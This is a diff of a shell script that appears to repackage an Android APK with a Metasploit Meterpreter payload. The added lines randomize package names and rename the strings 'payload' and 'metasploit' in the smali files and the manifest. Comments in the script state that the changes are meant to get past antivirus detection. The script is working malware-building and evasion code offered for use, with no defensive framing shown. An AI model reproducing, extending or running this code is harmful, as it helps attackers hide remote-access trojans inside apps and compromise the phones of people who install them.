@@ -30,6 +30,12 @@ APK=$(basename $fullPath)
 VAR1=`cat /dev/urandom | tr -cd 'a-z' | head -c 10` # smali dir renaming
 VAR2=`cat /dev/urandom | tr -cd 'a-z' | head -c 10` # smali dir renaming
 VAR3=`cat /dev/urandom | tr -cd 'a-z' | head -c 10` # Payload.smali renaming
+VAR4=`cat /dev/urandom | tr -cd 'a-z' | head -c 10` # Pakage name renaming 1
+VAR5=`cat /dev/urandom | tr -cd 'a-z' | head -c 10` # Pakage name renaming 2
+VAR6=`cat /dev/urandom | tr -cd 'a-z' | head -c 10` # Pakage name renaming 3
+VAR7=`cat /dev/urandom | tr -cd 'a-z' | head -c 10` # New name for word 'payload'
+VAR8=`cat /dev/urandom | tr -cd 'a-z' | head -c 10` # New name for word 'metasploit'
+
 JAR=`which apktool.jar`
 apkName=$(echo $APK | cut -f 1 -d '.')
 
@@ -54,10 +60,10 @@ sed -i "s#/metasploit/stage#/$VAR1/$VAR2#g" /tmp/payload/smali/com/$VAR1/$VAR2/*
 sed -i "s#Payload#$VAR3#g" /tmp/payload/smali/com/$VAR1/$VAR2/*
 
 #Flagged by AV, changed to something not as obvious
-sed -i "s#com.metasploit.meterpreter.AndroidMeterpreter#com.Android#" /tmp/payload/smali/com/$VAR1/$VAR2/$VAR3.smali
-sed -i "s#payload#loader#g" /tmp/payload/smali/com/$VAR1/$VAR2/$VAR3.smali
+sed -i "s#com.metasploit.meterpreter.AndroidMeterpreter#com.$VAR4.$VAR5.$VAR6#" /tmp/payload/smali/com/$VAR1/$VAR2/$VAR3.smali
+sed -i "s#payload#$VAR7#g" /tmp/payload/smali/com/$VAR1/$VAR2/$VAR3.smali
 sed -i "s#com.metasploit.stage#com.$VAR1.$VAR2#" /tmp/payload/AndroidManifest.xml
-sed -i "s#metasploit#AndroidProgram#" /tmp/payload/AndroidManifest.xml
+sed -i "s#metasploit#$VAR8#" /tmp/payload/AndroidManifest.xml
 sed -i "s#MainActivity#$apkName#" /tmp/payload/res/values/strings.xml
 
 #Re-arranging the permissions, which were being flagged if in perfect order
